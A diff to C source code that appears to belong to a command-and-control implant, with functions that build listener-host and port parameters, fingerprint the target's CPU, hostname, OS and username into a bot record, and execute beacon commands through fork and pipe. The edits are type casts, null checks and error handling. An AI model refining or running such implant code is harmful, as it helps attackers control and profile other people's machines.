@@ -123,7 +123,7 @@ int getPayloadEncoder() {
 
     char protocolEncoderJsonParams[4096] = "";
     int _tmp_charsWritten = snprintf(payloadEncoderJsonParams, sizeof(payloadEncoderJsonParams), "{\"KEY\": \"%s\"}", payloadEncoderKey);
-    if (_tmp_charsWritten >= sizeof(payloadEncoderJsonParams)) {
+    if (_tmp_charsWritten >= (int)sizeof(payloadEncoderJsonParams)) {
         return 0; // Params truncated
 
     }
@@ -146,7 +146,7 @@ int getProtocol(int *payloadEncoderID) {
     char *protocolEncoderKey = decodeMacro(PROTOCOL_ENCODER_KEY, payloadEncoderID);
 
     int _tmp_charsWritten = snprintf(protocolEncoderJsonParams, sizeof(protocolEncoderJsonParams), "{\"LHOST\": \"%s\", \"LPORT\": \"%s\", \"FIDELIUS\": \"%s\", \"KEY\": \"%s\"}", lhost, lport, protocolEncoderName, protocolEncoderKey);
-    if (_tmp_charsWritten >= sizeof(protocolEncoderJsonParams)) {
+    if (_tmp_charsWritten >= (int)sizeof(protocolEncoderJsonParams)) {
         return 0; // Params truncated by snprintf
 
     }
@@ -195,7 +195,7 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
     unsigned int eax, ebx, ecx, edx;
     
     cpuName[0] = '\0';
-    for (int i = 0x80000002; i <= 0x80000004; i++) {
+    for (int i = 0x80000002; i <= (int)0x80000004; i++) {
         if (__get_cpuid(i, &eax, &ebx, &ecx, &edx)) {
             unsigned int *_p = (unsigned int*)(cpuName + (i - 0x80000002) * 16);
             _p[0] = eax; _p[1] = ebx; _p[2] = ecx; _p[3] = edx;
@@ -255,7 +255,7 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
     char osHostname[128];
     char osName[128];
     char osVersion[128];
-    char *osUsername;
+    char *osUsername = "";
     double osUptime;
 
     char *_tmp_hostnamePath = decodeMacro(HOSTNAME_PATH, payloadEncoderID);
@@ -292,12 +292,14 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
     char *_username = malloc(_limit);
     if (_username) {
         if (getlogin_r(_username, _limit) == 0) {
-            osUsername = malloc(strlen(_username) + 1);
-            strcpy(osUsername, _username);
-
+            osUsername = (char*)malloc(strlen(_username) + 1);
+            if (osUsername != NULL) {
+                strcpy(osUsername, _username);
+                free(_username);
+                
+            }
+            
         }
-
-        free(_username);
 
     }
 
@@ -319,7 +321,6 @@ C_Scroll fetchTargetInfo(int *payloadEncoderID) {
     strcpy(botData.OS.Username, osUsername);
     botData.OS.Uptime = (int)osUptime;
 
-    free(osUsername);
     FreeGoMem(_tmp_osReleasePath);
 
     return botData;
@@ -511,7 +512,10 @@ int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
     int pipeOut[2];
     pid_t procPID;
 
-    pipe(pipeOut);
+    if (pipe(pipeOut) == -1) {
+        return 0; // Error in pipe
+
+    }
 
     procPID = fork();
     if (procPID < 0) {
